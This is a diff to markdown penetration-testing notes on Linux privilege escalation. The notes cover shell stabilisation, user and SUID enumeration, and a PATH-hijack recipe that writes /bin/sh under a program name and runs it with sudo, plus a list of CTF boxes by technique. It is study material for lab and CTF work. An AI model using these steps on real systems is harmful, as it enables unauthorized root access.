@@ -15,12 +15,12 @@ Read the scripts and see which one fits the box. Automate local enum, look for a
 
 **Stabilize Your Shell**
 Make another shell
-```scss
+```
 which nc
 nc $ip $port
 
 which python
-python -c 'import pty; pty.spawn("bin/bash");
+python -c 'import pty; pty.spawn("bin/bash")'
 
 // In Kali
 stty -a # Notice number of rows and columns
@@ -34,7 +34,7 @@ export TERM=xterm-256color
 
 ```
 **General Info/Enum**
-```scss
+```
 //username, groups
 id
 hostname
@@ -55,6 +55,11 @@ cat /etc/passwd | grep "sh$\|python"
 // sudo privs?
 sudo -l
 
+// Permissions
+find / -perm -4000 -ls 2>/dev/null
+
+// who has the password process
+ps -e -f | grep passwd
 ```
 **Abusing sudo**
 Does the user have a command or file that can run sudo?
@@ -62,30 +67,26 @@ Does the user have a command or file that can run sudo?
 Remember to check Programs on GTFOBins
 sudo -l 
 ```
-Symbolic links, PATH and privilage escalation vulnerability
-- referenses:
-	- [Vulnhub: Hackme 1](Hackme 1: https://www.vulnhub.com/entry/hackme-1,330/)
-	- [Hacking Articles: Using PATH Variable](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)
 
-```scss
+Symbolic links, PATH and privilage escalation vulnerability
+```
 // Absolutepath not specified
-	{
-	echo "/bin/sh" > <program_name>
-	chmod 777 <program_name>
-	}
+echo "/bin/sh" > <program_name>
+chmod 777 <program_name>
+
 
 // Export PATH=.:$PATH (to a gobal writable folder]
-	{
-	check current path 
-		export $PATH
-	add path
-		export:(newpath)$PATH
-	}
+check current path 
+export $PATH
+add path
+export:(newpath)$PATH
 
+// sudo launch program
 sudo <program_name> or ./<program_name>
-
 ```
-
+Further research:
+- [Vulnhub: Hackme 1](Hackme 1: https://www.vulnhub.com/entry/hackme-1,330/)
+- [Hacking Articles: Using PATH Variable](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)
 
 
 **Weak file permissions**
@@ -93,39 +94,41 @@ sudo <program_name> or ./<program_name>
 
 **Abusing wildcards**
 
-- [ ] Password file /etc/passwd has write access
+- Password file /etc/passwd has write access
 	- hacking articles: editing /etc/passwd file for privilage esclation
-- [ ] TCMP dump
+- TCMP dump
 	- [Vulnhub: Web developer 1](https://www.vulnhub.com/entry/web-developer-1,288/)Fred Wemeijer 5Nov2018
-- [ ] CHOWN | tar
+- CHOWN & tar
 	- hacking articles: exploiting wildcard for privilage esclation
-- [ ] mounting the folder
+- mounting the folder
 	- [Vulnhub: pegasus](https://www.vulnhub.com/entry/pegasus-1,109/)Knapsy 16Dec2014
-- [ ] group.xml file
+- group.xml file
 	- hacking articles: penatration testing on group policy references
-- [ ] SMB psexecution services
+- SMB psexecution services
 	- [HTB: active]
-- [ ] "doas" functionality similiar to sudo functionality and "less"
+- "doas" functionality similiar to sudo functionality and "less"
 	- [HTB: ypuffy]
 	- [HTB: four and six 2]
-- [ ] MySQL running as root
+- MySQL running as root
 	- hacking articles: raven2 machine
-- [ ] AWK
+- AWK
 	- hacking articles: linux privilage esclation using exploiting sudo rights
-- [ ] "rsh" is set with SUID bit | "pfexec" | wget in sudoers file
+- "rsh" is set with SUID bit, "pfexec", wget in sudoers file
 	- HTB: sunday
-- [ ] /usr/bin/pip mentioned in sudoers file
+- /usr/bin/pip mentioned in sudoers file
 	- hacking articles: wakanda
-- [ ] /bin/screen 4.5.0
+- /bin/screen 4.5.0
 	- HTB: haircut
-- [ ] curl
+- curl
 	- HTB: curling
-- [ ] tmux is screen multiplier running as root
+- tmux is screen multiplier running as root
 	- /bin/tmux
 
 ## Further References/Research
+### Reads
 - [Fundamentals of Linux Privilage Esclation](https://www.slideshare.net/nullthreat/fund-linux-priv-esc-wprotections) Elliot Cutright
-Videos
+
+### Videos
 - [Linux Privilage Esclation - Trade Craft Security Weekly #22](https://www.youtube.com/watch?v=oYHAi0cgur4) Security Weekly, Beau Bullock (@dafthack) - 14Dec2017
 - [Privilage Esclation FTW](https://www.youtube.com/watch?v=yXe4X-AIbps) Jake Williams - 15Nov2018
 - [ts Too Funky In Here04 Linux privilege escalation for fun profit and all around mischief Jake Willi](https://www.youtube.com/watch?v=kuE2yqULs-Y) Jake Williams - 10Sep2016 @MalwareJake
